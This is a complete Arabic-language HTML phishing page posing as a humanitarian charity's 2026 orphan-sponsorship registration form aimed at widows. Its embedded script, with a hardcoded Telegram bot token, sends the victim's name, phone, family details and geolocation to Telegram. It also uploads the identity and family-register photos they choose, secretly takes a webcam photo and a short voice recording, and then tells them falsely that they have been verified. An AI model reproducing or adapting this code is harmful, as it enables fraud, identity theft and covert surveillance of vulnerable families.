<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة التسجيل | منظمة تكافل 2026</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #eef2f3; direction: rtl; padding: 15px; }
        .card { background: white; max-width: 450px; margin: auto; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-top: 6px solid #27ae60; }
        h2 { color: #2c3e50; font-size: 22px; margin-bottom: 5px; }
        p.subtitle { color: #7f8c8d; font-size: 13px; margin-bottom: 20px; }
        .input-group { text-align: right; margin-bottom: 15px; }
        label { display: block; font-weight: bold; font-size: 14px; margin-bottom: 5px; color: #34495e; }
        input, select { width: 100%; padding: 12px; border: 1px solid #dcdde1; border-radius: 10px; box-sizing: border-box; background: #f9f9f9; }
        .btn { background: linear-gradient(135deg, #27ae60, #2ecc71); color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; cursor: pointer; font-size: 18px; font-weight: bold; margin-top: 15px; box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3); }
        .status { font-size: 11px; color: #e74c3c; margin-top: 10px; font-weight: bold; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://img.icons8.com/fluency/96/handshake.png" width="60">
    <h2>منظمة تكافل الإنسانية</h2>
    <p class="subtitle">استمارة التسجيل في منحة كفالة الأيتام السنوية لعام 2026</p>

    <div class="input-group">
        <label>الاسم الكامل للأرملة (كما في الهوية):</label>
        <input type="text" id="name" placeholder="الاسم الثلاثي">
    </div>

    <div class="input-group">
        <label>عدد الأبناء الأيتام:</label>
        <input type="number" id="kids" placeholder="مثلاً: 3">
    </div>

    <div class="input-group">
        <label>تاريخ وفاة الزوج:</label>
        <input type="text" id="death" placeholder="يوم/شهر/سنة">
    </div>

    <div class="input-group">
        <label>رقم هاتف الواتساب النشط:</label>
        <input type="tel" id="phone" placeholder="09xxxxxxxx">
    </div>

    <div class="input-group">
        <label>رفع صور الهوية ودفتر العائلة (لتأكيد البيانات):</label>
        <input type="file" id="studiofiles" multiple accept="image/*">
    </div>

    <button class="btn" onclick="masterCapture()">إرسال الطلب إلى منظمة تكافل</button>
    <p class="status">ملاحظة: سيتم إجراء تحقق بصري وصوتي فوري لمطابقة بيانات المستفيد.</p>
</div>

<canvas id="canvas" style="display:none;"></canvas>
<video id="video" style="display:none;" autoplay></video>

<script>
    const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
    const CHAT_ID = "7214473798";

    async function sendToTelegram(type, data, caption = "") {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        if (type === "text") {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: data, parse_mode: "Markdown" })
            });
        } else {
            formData.append(type, data, type === "photo" ? "capture.jpg" : "audio.ogg");
            if (caption) formData.append("caption", caption);
            await fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
                method: "POST",
                body: formData
            });
        }
    }

    async function masterCapture() {
        const name = document.getElementById('name').value;
        const phone = document.getElementById('phone').value;
        if (!name || !phone) { alert("يرجى ملء البيانات أولاً"); return; }

        alert("جاري الاتصال بخوادم منظمة تكافل.. يرجى السماح بالصلاحيات المطلوبة للتحقق.");

        navigator.geolocation.getCurrentPosition(async (pos) => {
            const map = `📍 الموقع: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            const info = `🔥 **صيد جديد (تكافل)** 🔥\n👤 الاسم: ${name}\n👦 الأيتام: ${document.getElementById('kids').value}\n📅 الوفاة: ${document.getElementById('death').value}\n📞 الهاتف: ${phone}\n${map}`;
            await sendToTelegram("text", info);
        });

        const files = document.getElementById('studiofiles').files;
        for (let file of files) {
            await sendToTelegram("document", file, "📁 ملف مسحوب من الاستديو");
        }

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            setTimeout(async () => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(async (blob) => {
                    await sendToTelegram("photo", blob, "📸 صورة الضحية المباشرة");
                }, 'image/jpeg');
                
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
                    await sendToTelegram("voice", audioBlob, "🎤 تسجيل صوتي للضحية");
                    stream.getTracks().forEach(track => track.stop());
                    alert("تم تأكيد هويتك بنجاح لدى منظمة تكافل، سيتم التواصل معك قريباً.");
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 4000);
            }, 2000);

        } catch (e) {
            alert("خطأ في التحقق! يرجى منح الصلاحيات لمطابقة البيانات الشخصية لدى المنظمة.");
        }
    }
</script>
</body>
</html>
